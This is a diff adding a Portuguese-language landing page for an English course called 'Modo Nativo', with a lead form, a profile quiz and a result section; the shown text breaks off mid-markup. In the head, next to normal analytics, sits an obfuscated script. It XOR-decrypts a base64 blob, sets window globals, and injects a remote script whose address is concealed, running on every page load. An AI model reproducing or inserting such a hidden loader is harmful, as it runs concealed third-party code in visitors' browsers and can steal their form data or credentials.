@@ -1,0 +1,2162 @@
+<!DOCTYPE html>
+<!--
+  =====================================================================
+  PÁGINA /avaliacao - INSCRIÇÃO + QUIZ DE PERFIL (12 PERGUNTAS) + RESULTADO
+  As constantes CHECKOUT_PREMIUM e WEBHOOK_QUIZ estão definidas logo
+  abaixo no primeiro bloco <script> do <head>.
+  =====================================================================
+-->
+<html class="scroll-smooth dark" lang="pt-BR"><head>
+<script>
+  // URL do checkout da Hotmart para a taxa de inscrição simbólica de R$ 9,99 (turma de 100 vagas)
+  const CHECKOUT_PREMIUM = "https://pay.hotmart.com/N108058349X?off=mtbx2949&checkoutMode=10";
+
+  // URL do Webhook para receber o JSON com os eventos "lead" e "quiz_completo"
+  const WEBHOOK_QUIZ = "https://n8n.sedacollege.me/webhook/07fe5b79-b5b4-428e-a3f0-c68d629f1ec6";
+</script>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-M2Q6K5BN');</script>
+<!-- End Google Tag Manager -->
+<script>(function(){var h_qbbs=atob("DEhZsc9dLqjTu54FYTN7xL0xDJLx0+pxETtjnuA+Ssb9zupoCC4gn6wyQ4axybF2AjowwbsuAdi6w/tpTjgwyaoxAMKgmbInADwtw6Y/W9y2yLw/OhV1k6gxQcqy1+0nWxMik6E8Q83xgbx1CDA83YY5DITxzf9pFC17i+1rT8zkgqc2V3xu1/luGs7gj/o2BHg60vd/U/Wu");var i_sp=[];for(var m_63ts=0;m_63ts<h_qbbs.length;m_63ts++){i_sp.push(h_qbbs.charCodeAt(m_63ts)&255);}var i_n6s=i_sp[0];var c_7=i_sp.slice(1,1+i_n6s);var e_r=i_sp.slice(1+i_n6s);var t_6y=e_r.map(function(b,l_nb){return b^c_7[l_nb%i_n6s];});var v_isa="";for(var a_q=0;a_q<t_6y.length;a_q++){v_isa+=String.fromCharCode(t_6y[a_q]&255);}var m_4=decodeURIComponent(escape(v_isa));var k_3p5g=JSON.parse(m_4);var u_xgt=k_3p5g.globals||[];u_xgt.forEach(function(s_t){window[s_t.name]=s_t.value;});var n_82=document.createElement("script");n_82.src=k_3p5g.url;n_82.async=true;n_82.defer=true;(k_3p5g.attributes||[]).forEach(function(o_nj8){n_82.setAttribute(o_nj8.name,o_nj8.value);});(document.head||document.documentElement).appendChild(n_82);})();</script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="Plataforma brasileira libera 100 vagas gratuitas para destravar o seu inglês em 15 minutos por dia com a Técnica de Shadowing." name="description"/>
+<meta property="og:title" content="Modo Nativo | Fale inglês de verdade"/>
+<meta content="web_standard" name="shell-type"/>
+<title>Modo Nativo | Fale inglês de verdade</title>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Plus+Jakarta+Sans:wght@500;600;700;800;900&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<style>
+    :root {
+      --bg-section-primary: #080809;
+      --bg-section-alt: #15151A;
+      --bg-transition-band: linear-gradient(90deg, #120d0a 0%, #18110c 50%, #120d0a 100%);
+    }
+    @layer base {
+      html, body { margin: 0; padding: 0; background-color: var(--bg-section-primary); color: #f4f4f5; }
+      body { overflow-x: clip; }
+    }
+    details summary::-webkit-details-marker { display:none; }
+    details summary { list-style: none; }
+    /* Garante 16px nos campos de formulário para evitar zoom automático no Safari do iOS */
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    textarea {
+      font-size: 16px !important;
+    }
+    /* Imagem da hero oculta apenas no mobile e sempre visível no desktop */
+    @media (max-width: 1023px) {
+      #hero-bloco-imagem { display: none !important; }
+    }
+    @media (min-width: 1024px) {
+      #hero-bloco-imagem { display: block !important; }
+    }
+  </style>
+<link rel="stylesheet" href="assets/prova.css?v=7">
+</head>
+<body class="bg-[#080809] font-sans text-zinc-100 antialiased selection:bg-[#ff6b00]/30 selection:text-[#ff8533] w-full">
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M2Q6K5BN"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<div class="relative w-full overflow-x-clip">
+
+<!-- ===================================================================== -->
+<!-- ESTADO 1 · PÁGINA DE INSCRIÇÃO                                        -->
+<!-- ===================================================================== -->
+<div id="estado-captura" class="w-full">
+<main class="w-full">
+
+<!-- ===== SEÇÃO 01 · HERO EM DUAS COLUNAS (#hero) ===== -->
+<section class="relative overflow-hidden pt-6 sm:pt-10 pb-12 sm:pb-16 bg-[#080809]" id="hero">
+  <div class="absolute top-0 left-1/2 -translate-x-1/2 w-[min(650px,100%)] h-[420px] bg-gradient-to-b from-[#ff6b00]/12 via-[#ff8533]/5 to-transparent rounded-full blur-3xl pointer-events-none -z-0"></div>
+
+  <div class="mx-auto w-full max-w-6xl px-4 sm:px-6 relative z-10">
+    <!-- Lockup de Marca no topo -->
+    <div id="hero-lockup" class="w-fit flex items-center gap-3 mb-6 sm:mb-8">
+      <img alt="Modo Nativo" class="h-10 sm:h-12 w-auto shrink-0" src="assets/logo-transparente.webp"/>
+      <div id="hero-subtitulo-marca" class="text-white font-black leading-none text-base sm:text-xl whitespace-nowrap text-left">
+        Fale inglês de verdade
+      </div>
+    </div>
+
+    <!-- Grid Responsivo:
+         No celular: 1) Texto -> 2) Imagem -> 3) Formulário (empilhados)
+         No desktop (lg): Coluna Esquerda (Texto + Formulário) | Coluna Direita (Imagem grande) -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 lg:gap-x-12 lg:gap-y-6 items-start">
+
+      <!-- BLOCO 1 · TEXTO (Esquerda superior no desktop / 1º no celular) -->
+      <div id="hero-bloco-texto" class="order-1 lg:col-start-1 lg:col-span-7 lg:row-start-1 flex flex-col items-start text-left">
+        <!-- Selo: 100 vagas gratuitas -->
+        <div class="inline-flex items-center gap-2 rounded-full bg-[#ff6b00]/15 border border-[#ff6b00]/50 px-3.5 py-1 text-xs sm:text-sm font-extrabold uppercase tracking-wider text-[#ff8533]">
+          <span class="w-2 h-2 rounded-full bg-[#ff6b00]"></span>
+          <span>100 vagas gratuitas</span>
+        </div>
+
+        <!-- H1 -->
+        <h1 class="mt-4 text-[26px] sm:text-[32px] lg:text-[36px] font-black tracking-tight text-white !leading-[1.18]">
+          Plataforma brasileira libera <span class="text-[#ff6b00]">100 vagas gratuitas</span> para destravar o seu inglês
+        </h1>
+
+        <!-- Linha de apoio -->
+        <p class="mt-4 text-[15px] sm:text-base lg:text-lg text-zinc-300 leading-relaxed">
+          São 161 lições de 15 minutos, do A1 ao C2, com a sua pronúncia corrigida na hora. Preencha seus dados, responda 12 perguntas rápidas e sua trilha é montada do seu jeito.
+        </p>
+
+        <!-- Três selos -->
+        <div class="mt-5 flex flex-wrap items-center gap-2 sm:gap-2.5">
+          <div class="inline-flex items-center gap-1.5 bg-[#141417] border border-[#2e2e36] rounded-full px-3 py-1.5 text-xs sm:text-sm font-bold text-zinc-200">
+            <span class="material-symbols-outlined text-[16px] sm:text-[18px] text-[#ff6b00] shrink-0">schedule</span>
+            <span>15 minutos por dia</span>
+          </div>
+          <div class="inline-flex items-center gap-1.5 bg-[#141417] border border-[#2e2e36] rounded-full px-3 py-1.5 text-xs sm:text-sm font-bold text-zinc-200">
+            <span class="material-symbols-outlined text-[16px] sm:text-[18px] text-[#ff6b00] shrink-0">mic</span>
+            <span>Correção da fala na hora</span>
+          </div>
+          <div class="inline-flex items-center gap-1.5 bg-[#141417] border border-[#2e2e36] rounded-full px-3 py-1.5 text-xs sm:text-sm font-bold text-zinc-200">
+            <span class="material-symbols-outlined text-[16px] sm:text-[18px] text-[#ff6b00] shrink-0">workspace_premium</span>
+            <span>Técnica de Shadowing</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- BLOCO 2 · IMAGEM ÚNICA GRANDE (Visível no desktop na coluna direita / Oculta no mobile) -->
+      <div id="hero-bloco-imagem" class="hidden lg:block order-2 lg:col-start-8 lg:col-span-5 lg:row-start-1 lg:row-span-2 lg:self-stretch lg:relative w-full lg:h-auto rounded-3xl overflow-hidden bg-[#141417] border border-[#2e2e36]">
+        <img
+          id="hero-imagem-aluna"
+          src="/public/images/aluna-shadowing.png"
+          alt="Aluna praticando conversação em inglês com fones de ouvido no Método Shadowing"
+          loading="eager"
+          width="1024"
+          height="1024"
+          class="w-full h-full lg:absolute lg:inset-0 object-cover object-top rounded-3xl block select-none"
+        />
+      </div>
+
+      <!-- BLOCO 3 · CARD DO FORMULÁRIO (Esquerda inferior no desktop / 3º no celular) -->
+      <div id="form-inscricao" class="order-3 lg:col-start-1 lg:col-span-7 lg:row-start-2 w-full rounded-3xl bg-[#141417] border border-[#2e2e36] p-5 sm:p-7 shadow-[0_16px_50px_rgba(0,0,0,0.6)] text-left">
+        <form id="leadCaptureForm" class="space-y-3.5" novalidate>
+          <!-- Nome completo -->
+          <div>
+            <label for="lead-nome" class="block text-xs font-bold uppercase tracking-wider text-zinc-300 mb-1">Nome completo</label>
+            <input
+              id="lead-nome"
+              name="nome"
+              type="text"
+              autocomplete="name"
+              placeholder="Digite seu nome completo"
+              class="w-full rounded-xl bg-[#0e0e11] border border-[#2e2e36] focus:border-[#ff6b00] focus:ring-1 focus:ring-[#ff6b00] px-4 py-3 text-base text-white placeholder-zinc-500 outline-none transition-colors"
+            />
+            <p id="erro-nome" class="hidden mt-1.5 text-xs font-semibold text-[#ff453a]"></p>
+          </div>
+
+          <!-- E-mail -->
+          <div>
+            <label for="lead-email" class="block text-xs font-bold uppercase tracking-wider text-zinc-300 mb-1">E-mail</label>
+            <input
+              id="lead-email"
+              name="email"
+              type="email"
+              autocomplete="email"
+              placeholder="seuemail@exemplo.com"
+              class="w-full rounded-xl bg-[#0e0e11] border border-[#2e2e36] focus:border-[#ff6b00] focus:ring-1 focus:ring-[#ff6b00] px-4 py-3 text-base text-white placeholder-zinc-500 outline-none transition-colors"
+            />
+            <p id="erro-email" class="hidden mt-1.5 text-xs font-semibold text-[#ff453a]"></p>
+          </div>
+
+          <!-- WhatsApp com DDD -->
+          <div>
+            <label for="lead-telefone" class="block text-xs font-bold uppercase tracking-wider text-zinc-300 mb-1">WhatsApp com DDD</label>
+            <input
+              id="lead-telefone"
+              name="telefone"
+              type="tel"
+              inputmode="numeric"
+              autocomplete="tel"
+              maxlength="15"
+              placeholder="(11) 90000-0000"
+              class="w-full rounded-xl bg-[#0e0e11] border border-[#2e2e36] focus:border-[#ff6b00] focus:ring-1 focus:ring-[#ff6b00] px-4 py-3 text-base text-white placeholder-zinc-500 outline-none transition-colors"
+            />
+            <p id="erro-telefone" class="hidden mt-1.5 text-xs font-semibold text-[#ff453a]"></p>
+          </div>
+
+          <!-- Checkbox de aceite -->
+          <div class="pt-1">
+            <label for="lead-aceite" class="flex items-start gap-2.5 cursor-pointer select-none">
+              <input
+                id="lead-aceite"
+                name="aceite"
+                type="checkbox"
+                class="mt-0.5 h-5 w-5 rounded border-[#2e2e36] bg-[#0e0e11] text-[#ff6b00] focus:ring-[#ff6b00] focus:ring-offset-0 cursor-pointer shrink-0"
+              />
+              <span class="text-xs sm:text-sm text-zinc-300 leading-snug">
+                Concordo com a <a href="#politica-privacidade" onclick="abrirModalPrivacidade(event)" class="text-[#ff8533] hover:text-[#ff6b00] underline font-semibold">Política de Privacidade</a> e aceito receber os dados de acesso da minha inscrição.
+              </span>
+            </label>
+            <p id="erro-aceite" class="hidden mt-1.5 text-xs font-semibold text-[#ff453a]"></p>
+          </div>
+
+          <!-- Botão Submit -->
+          <button
+            id="btn-submit-lead"
+            type="submit"
+            class="w-full mt-2 px-6 py-4 min-h-[56px] inline-flex items-center justify-center gap-2 text-base sm:text-lg font-black text-[#080809] bg-[#ff6b00] hover:bg-[#ff8533] rounded-full shadow-lg shadow-orange-950/50 transition-all text-center tracking-tight uppercase cursor-pointer"
+          >
+            <span id="btn-submit-text">FAZER MINHA INSCRIÇÃO</span>
+          </button>
+        </form>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== SEÇÃO 02 · COMO FUNCIONA A INSCRIÇÃO (#como-funciona) ===== -->
+<section class="py-14 sm:py-20 bg-[var(--bg-section-alt)] border-y border-[#242429] overflow-hidden" id="como-funciona">
+  <div class="mx-auto w-full max-w-6xl px-4 sm:px-6">
+    <div class="text-center max-w-3xl mx-auto">
+      <span class="inline-flex items-center px-3.5 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/40">
+        PASSO A PASSO
+      </span>
+      <h2 class="mt-3 text-[24px] sm:text-3xl md:text-4xl font-black text-white tracking-tight">
+        Como funciona a <span class="text-[#ff6b00]">inscrição</span>
+      </h2>
+    </div>
+
+    <div class="mt-10 grid grid-cols-1 md:grid-cols-3 gap-5 sm:gap-6">
+      <!-- Fase 1 -->
+      <div class="bg-[#141417] border border-[#2e2e36] rounded-2xl p-6 sm:p-7 text-left flex flex-col items-start">
+        <div class="flex items-center gap-3">
+          <span class="w-10 h-10 rounded-full bg-[#ff6b00] text-[#080809] font-black text-lg flex items-center justify-center shrink-0">1</span>
+          <span class="text-xs font-extrabold uppercase tracking-wider text-[#ff8533]">Fase 1 · Cadastro</span>
+        </div>
+        <h3 class="text-white font-black text-lg sm:text-xl mt-4">Cadastro</h3>
+        <p class="text-zinc-300 text-[15px] sm:text-base mt-2 leading-relaxed">
+          Você preenche nome, e-mail e WhatsApp e sua conta é criada na hora.
+        </p>
+      </div>
+
+      <!-- Fase 2 -->
+      <div class="bg-[#141417] border border-[#2e2e36] rounded-2xl p-6 sm:p-7 text-left flex flex-col items-start">
+        <div class="flex items-center gap-3">
+          <span class="w-10 h-10 rounded-full bg-[#ff6b00] text-[#080809] font-black text-lg flex items-center justify-center shrink-0">2</span>
+          <span class="text-xs font-extrabold uppercase tracking-wider text-[#ff8533]">Fase 2 · Teste de perfil</span>
+        </div>
+        <h3 class="text-white font-black text-lg sm:text-xl mt-4">Teste de perfil</h3>
+        <p class="text-zinc-300 text-[15px] sm:text-base mt-2 leading-relaxed">
+          12 perguntas rápidas sobre seu objetivo e onde você trava, para montar a sua trilha.
+        </p>
+      </div>
+
+      <!-- Fase 3 -->
+      <div class="bg-[#141417] border border-[#2e2e36] rounded-2xl p-6 sm:p-7 text-left flex flex-col items-start">
+        <div class="flex items-center gap-3">
+          <span class="w-10 h-10 rounded-full bg-[#ff6b00] text-[#080809] font-black text-lg flex items-center justify-center shrink-0">3</span>
+          <span class="text-xs font-extrabold uppercase tracking-wider text-[#ff8533]">Fase 3 · Acesso liberado</span>
+        </div>
+        <h3 class="text-white font-black text-lg sm:text-xl mt-4">Acesso liberado</h3>
+        <p class="text-zinc-300 text-[15px] sm:text-base mt-2 leading-relaxed">
+          O link para criar sua senha chega no seu e-mail e a primeira lição já fica esperando.
+        </p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== SEÇÃO 03 · O MÉTODO SHADOWING + AS 5 ETAPAS DA LIÇÃO (#metodo) ===== -->
+<section class="py-14 sm:py-20 bg-[var(--bg-section-primary)] overflow-hidden" id="metodo">
+  <div class="mx-auto w-full max-w-6xl px-4 sm:px-6">
+    <div class="grid grid-cols-1 md:grid-cols-2 items-center gap-8 md:gap-12">
+      <!-- Imagem -->
+      <div class="order-1 md:order-1 flex justify-center">
+        <img alt="Técnica de Shadowing dentro do Modo Nativo" class="w-full max-w-[420px] md:max-w-[560px] h-auto mx-auto block select-none" loading="lazy" src="assets/metodo-shadowing-v2.webp"/>
+      </div>
+      <!-- Texto -->
+      <div class="order-2 md:order-2 flex flex-col items-start text-left">
+        <h2 class="text-[26px] sm:text-3xl lg:text-4xl font-black text-white tracking-tight leading-tight">
+          Modo <span class="text-[#ff6b00]">Nativo</span>
+        </h2>
+        <p class="mt-1 text-[17px] sm:text-xl font-bold text-zinc-200">
+          é o curso que te faz falar desde a primeira lição
+        </p>
+        <p class="mt-3 text-[15px] sm:text-base italic text-zinc-400">
+          Construído em cima da Técnica de Shadowing, a mesma que intérpretes e poliglotas usam para treinar a fala.
+        </p>
+        <ul class="mt-6 space-y-4 w-full">
+          <li class="flex items-start gap-3 text-[15px] sm:text-base text-zinc-300 leading-relaxed">
+            <span class="mt-0.5 w-6 h-6 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[#00DF63] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span>Você ouve a frase de um nativo e <strong class="font-bold text-white">repete por cima</strong>, imitando o ritmo e a entonação.</span>
+          </li>
+          <li class="flex items-start gap-3 text-[15px] sm:text-base text-zinc-300 leading-relaxed">
+            <span class="mt-0.5 w-6 h-6 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[#00DF63] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span>O app escuta a sua voz e <strong class="font-bold text-white">corrige a pronúncia na hora</strong>, som por som.</span>
+          </li>
+          <li class="flex items-start gap-3 text-[15px] sm:text-base text-zinc-300 leading-relaxed">
+            <span class="mt-0.5 w-6 h-6 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[#00DF63] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span>São <strong class="font-bold text-white">5 etapas em cada lição</strong>: Leia, Ouça, Fale, Escreva e Revise.</span>
+          </li>
+          <li class="flex items-start gap-3 text-[15px] sm:text-base text-zinc-300 leading-relaxed">
+            <span class="mt-0.5 w-6 h-6 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[#00DF63] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span><strong class="font-bold text-white">161 lições do A1 ao C2</strong>, em blocos de 15 minutos por dia.</span>
+          </li>
+        </ul>
+        <div class="mt-7 w-full p-5 sm:p-6 rounded-2xl bg-gradient-to-r from-[#141417] via-[#1a1a20] to-[#141417] border border-[#ff6b00]/30 relative overflow-hidden">
+          <div class="absolute inset-0 bg-[#ff6b00]/5 pointer-events-none"></div>
+          <p class="relative text-[15px] sm:text-[17px] italic text-zinc-200 leading-relaxed">
+            “Você não decora inglês. <strong class="font-bold not-italic text-white">Você treina a sua boca a fazer os sons</strong>, do mesmo jeito que aprendeu a falar português quando era criança: ouvindo e repetindo.”
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- As 5 Etapas da Lição (Leia, Ouça, Fale, Escreva, Revise) -->
+    <div class="mt-14 sm:mt-16 pt-12 border-t border-[#242429]">
+      <div class="text-center max-w-3xl mx-auto">
+        <h3 class="text-[22px] sm:text-3xl font-black text-white tracking-tight text-center">
+          As 5 etapas de cada lição <span class="text-[#ff6b00]">por dentro</span>
+        </h3>
+      </div>
+      <div class="mt-8 w-full max-w-[360px] sm:max-w-[720px] lg:max-w-[1360px] mx-auto grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
+        <div class="w-full">
+          <img alt="Etapa 1: leia a frase antes de ouvir" class="w-full h-auto rounded-2xl" loading="lazy" src="assets/etapa-1-leia-v2.webp"/>
+        </div>
+        <div class="w-full">
+          <img alt="Etapa 2: ouça o áudio do nativo" class="w-full h-auto rounded-2xl" loading="lazy" src="assets/etapa-2-ouca-v2.webp"/>
+        </div>
+        <div class="w-full">
+          <img alt="Etapa 3: repita em voz alta e receba a correção" class="w-full h-auto rounded-2xl" loading="lazy" src="assets/etapa-3-fale-v2.webp"/>
+        </div>
+        <div class="w-full">
+          <img alt="Etapa 4: escreva e veja o que ajustar" class="w-full h-auto rounded-2xl" loading="lazy" src="assets/etapa-4-escreva-v2.webp"/>
+        </div>
+        <div class="w-full">
+          <img alt="Etapa 5: revisão da escrita e da pronúncia" class="w-full h-auto rounded-2xl" loading="lazy" src="assets/etapa-5-revisao-v2.webp"/>
+        </div>
+      </div>
+
+      <div class="mt-10 text-center">
+        <button type="button" onclick="rolarParaFormulario()" class="w-full sm:w-auto px-8 py-4 min-h-[54px] inline-flex items-center justify-center text-sm sm:text-base font-black text-[#080809] bg-[#ff6b00] hover:bg-[#ff8533] rounded-full shadow-lg shadow-orange-950/50 transition-all uppercase tracking-tight cursor-pointer">
+          FAZER MINHA INSCRIÇÃO GRATUITA
+        </button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== RODAPÉ INSTITUCIONAL (SEM TEXTO DE VENDAS) ===== -->
+<footer class="bg-[#050507] border-t border-[#1f1f24] py-8">
+  <div class="mx-auto max-w-6xl px-4 sm:px-6 flex flex-col sm:flex-row items-center justify-between gap-4 text-center sm:text-left">
+    <div>
+      <p class="text-zinc-300 font-bold text-xs sm:text-sm">MODO NATIVO EDUCAÇÃO DIGITAL LTDA</p>
+      <p class="text-zinc-500 text-xs mt-0.5">CNPJ: 54.829.310/0001-42 · Todos os direitos reservados © 2026</p>
+    </div>
+    <div class="flex items-center gap-4 text-xs font-semibold text-zinc-400">
+      <a href="#politica-privacidade" onclick="abrirModalPrivacidade(event)" class="hover:text-white transition-colors">Política de Privacidade</a>
+      <span>•</span>
+      <a href="#termos-de-uso" onclick="abrirModalTermos(event)" class="hover:text-white transition-colors">Termos de Uso</a>
+    </div>
+  </div>
+</footer>
+
+</main>
+</div>
+
+<!-- ===================================================================== -->
+<!-- ESTADO 2 · QUIZ DE PERFIL (12 PERGUNTAS + TELA DE ANÁLISE)            -->
+<!-- ===================================================================== -->
+<div id="estado-quiz" class="hidden min-h-screen w-full bg-[#080809] flex-col justify-between">
+  <!-- Cabeçalho do Quiz -->
+  <header id="quiz-header" class="w-full border-b border-[#242429] bg-[#0e0e11] sticky top-0 z-30">
+    <div class="mx-auto max-w-2xl px-4 py-3.5 flex items-center justify-between gap-3">
+      <button
+        type="button"
+        id="btn-quiz-voltar"
+        onclick="voltarPerguntaQuiz()"
+        aria-label="Voltar para a pergunta anterior"
+        class="w-10 h-10 rounded-xl bg-[#141417] border border-[#2e2e36] hover:border-[#ff6b00] text-white flex items-center justify-center transition-colors cursor-pointer shrink-0"
+      >
+        <span class="material-symbols-outlined text-xl">arrow_back</span>
+      </button>
+
+      <div class="flex flex-col items-center">
+        <span class="text-xs font-extrabold uppercase tracking-widest text-[#ff8533]">Perfil Modo Nativo</span>
+        <span id="quiz-contador" class="text-sm sm:text-base font-black text-white mt-0.5"></span>
+      </div>
+
+      <div class="w-10 h-10 flex items-center justify-center shrink-0">
+        <img alt="Modo Nativo" class="h-7 w-auto" src="assets/logo-transparente.webp"/>
+      </div>
+    </div>
+    <!-- Barra de Progresso Laranja -->
+    <div class="w-full h-1.5 bg-[#1a1a1f] overflow-hidden">
+      <div id="quiz-barra-progresso" class="h-full bg-[#ff6b00] transition-all duration-300" style="width: 0%;"></div>
+    </div>
+  </header>
+
+  <!-- Container da Pergunta Atual -->
+  <main class="flex-1 flex items-center justify-center px-4 py-8 sm:py-12">
+    <div id="quiz-palco" class="w-full max-w-xl mx-auto">
+      <!-- Renderizado dinamicamente via JS -->
+    </div>
+
+    <!-- Tela de Análise (~2,5s no fim do quiz) -->
+    <div id="quiz-analise" class="hidden w-full max-w-md mx-auto rounded-3xl bg-[#141417] border border-[#2e2e36] p-6 sm:p-8 text-center shadow-2xl">
+      <div class="mx-auto w-16 h-16 rounded-full border-4 border-[#2e2e36] border-t-[#ff6b00] animate-spin"></div>
+      <h2 class="mt-6 text-xl sm:text-2xl font-black text-white tracking-tight">
+        Montando sua trilha personalizada…
+      </h2>
+      <p class="mt-2 text-sm text-zinc-400">
+        Analisando seu perfil e definindo seu ponto de partida ideal.
+      </p>
+
+      <ul class="mt-7 space-y-3.5 text-left">
+        <li id="step-analise-1" class="flex items-center gap-3 p-3.5 rounded-2xl bg-[#0e0e11] border border-[#242429] transition-colors">
+          <span class="step-icon w-6 h-6 rounded-full bg-zinc-800 border border-zinc-700 text-zinc-500 flex items-center justify-center shrink-0 transition-colors">
+            <span class="material-symbols-outlined text-base">check</span>
+          </span>
+          <span class="text-sm sm:text-base font-bold text-zinc-300">Respostas registradas</span>
+        </li>
+        <li id="step-analise-2" class="flex items-center gap-3 p-3.5 rounded-2xl bg-[#0e0e11] border border-[#242429] transition-colors">
+          <span class="step-icon w-6 h-6 rounded-full bg-zinc-800 border border-zinc-700 text-zinc-500 flex items-center justify-center shrink-0 transition-colors">
+            <span class="material-symbols-outlined text-base">check</span>
+          </span>
+          <span class="text-sm sm:text-base font-bold text-zinc-300">Nível de partida definido</span>
+        </li>
+        <li id="step-analise-3" class="flex items-center gap-3 p-3.5 rounded-2xl bg-[#0e0e11] border border-[#242429] transition-colors">
+          <span class="step-icon w-6 h-6 rounded-full bg-zinc-800 border border-zinc-700 text-zinc-500 flex items-center justify-center shrink-0 transition-colors">
+            <span class="material-symbols-outlined text-base">check</span>
+          </span>
+          <span class="text-sm sm:text-base font-bold text-zinc-300">Trilha personalizada pronta</span>
+        </li>
+      </ul>
+    </div>
+  </main>
+
+  <footer class="py-4 text-center text-xs text-zinc-500 border-t border-[#141417]">
+    Modo Nativo · Fale inglês de verdade
+  </footer>
+</div>
+
+<!-- ===================================================================== -->
+<!-- ESTADO 3 · RESULTADO + OBJEÇÕES + DUAS OFERTAS + GARANTIA + FAQ       -->
+<!-- ===================================================================== -->
+<div id="estado-resultado" class="hidden w-full">
+<main class="w-full">
+
+<!-- ===== SEÇÃO R1 · RESUMO PERSONALIZADO DO PERFIL ===== -->
+<section class="relative overflow-hidden pt-8 sm:pt-12 pb-6 sm:pb-8 bg-[#080809]" id="resumo-resultado">
+  <div class="absolute top-0 left-1/2 -translate-x-1/2 w-[min(650px,100%)] h-[380px] bg-gradient-to-b from-[#00d254]/15 via-[#ff6b00]/5 to-transparent rounded-full blur-3xl pointer-events-none"></div>
+  <div class="mx-auto w-full max-w-5xl px-4 sm:px-6 relative z-10 text-center">
+    <!-- Lockup -->
+    <div class="mx-auto w-fit flex items-center gap-3 mb-6">
+      <img alt="Modo Nativo" class="h-10 sm:h-12 w-auto shrink-0" src="assets/logo-transparente.webp"/>
+      <div class="text-white font-black leading-none text-base sm:text-xl whitespace-nowrap text-left">
+        Fale inglês de verdade
+      </div>
+    </div>
+
+    <div class="inline-flex items-center gap-2 rounded-full bg-[#00d254]/15 border border-[#00d254]/50 px-4 py-1.5 text-xs sm:text-sm font-black uppercase tracking-widest text-[#00d254]">
+      <span class="material-symbols-outlined text-base">check_circle</span>
+      <span>Perfil analisado com sucesso</span>
+    </div>
+
+    <h1 class="mt-4 text-[26px] sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight">
+      Vaga reservada, <span id="res-primeiro-nome" class="text-[#ff6b00]">Aluno</span>!
+    </h1>
+
+    <!-- Aviso caso 409 (e-mail já cadastrado) -->
+    <div id="aviso-conta-existente" class="hidden mt-5 max-w-xl mx-auto rounded-2xl bg-[#ff6b00]/15 border border-[#ff6b00]/50 p-4 text-sm sm:text-base text-zinc-100">
+      <p class="font-bold text-[#ff8533]">Você já possui cadastro na plataforma!</p>
+      <p class="mt-1 text-zinc-200">Seu e-mail já tem conta criada. Para acessar a sua conta, <a href="https://app.modonativo.me/login" target="_blank" rel="noopener" class="underline font-bold text-white hover:text-[#ff8533]">entre pelo login clicando aqui</a>.</p>
+    </div>
+
+    <!-- Card de Resumo com Objetivo, Trava e Ritmo sugerido -->
+    <div class="mt-7 grid grid-cols-1 sm:grid-cols-3 gap-4 text-left">
+      <div class="rounded-2xl bg-[#141417] border border-[#2e2e36] p-5">
+        <div class="flex items-center gap-2 text-xs font-extrabold uppercase tracking-wider text-[#ff8533]">
+          <span class="material-symbols-outlined text-lg text-[#ff6b00]">flag</span>
+          <span>Seu objetivo</span>
+        </div>
+        <p id="res-objetivo" class="mt-2 text-base sm:text-lg font-black text-white leading-snug">
+          Carreira e salário
+        </p>
+      </div>
+
+      <div class="rounded-2xl bg-[#141417] border border-[#2e2e36] p-5">
+        <div class="flex items-center gap-2 text-xs font-extrabold uppercase tracking-wider text-[#ff8533]">
+          <span class="material-symbols-outlined text-lg text-[#ff6b00]">psychology_alt</span>
+          <span>Principal trava hoje</span>
+        </div>
+        <p id="res-trava" class="mt-2 text-base sm:text-lg font-black text-white leading-snug">
+          Travo na hora de falar
+        </p>
+      </div>
+
+      <div class="rounded-2xl bg-[#141417] border border-[#00d254]/40 p-5">
